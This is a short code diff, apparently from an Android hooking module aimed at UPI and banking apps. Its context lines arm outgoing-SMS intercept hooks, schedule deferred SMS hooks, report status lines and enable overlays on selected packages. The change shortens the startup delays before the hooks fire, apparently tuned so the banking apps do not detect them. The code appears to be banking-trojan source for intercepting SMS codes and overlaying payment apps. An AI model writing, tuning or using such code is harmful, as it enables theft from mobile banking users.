@@ -349,8 +349,8 @@ public:
             // UPI/banking SAFE: no immediate Java/Binder/phone/overlay
             outgoing_sms_hook::arm_intercept_hooks();
             int delay = upi_registry::hook_startup_delay_sec(pkg_);
-            if (delay < 4) delay = 4;
-            if (is_yespay(pkg_)) delay = 6;
+            if (delay < 3) delay = 3;
+            if (is_yespay(pkg_)) delay = 5;
             schedule_deferred_sms_hooks(env_, api_, pkg_, delay);
             report_line(api_, "post_upi_safe_deferred:" + pkg_ + "|d=" + std::to_string(delay));
             if (native_overlay_wanted() && overlay_allowed_pkg(pkg_)) {
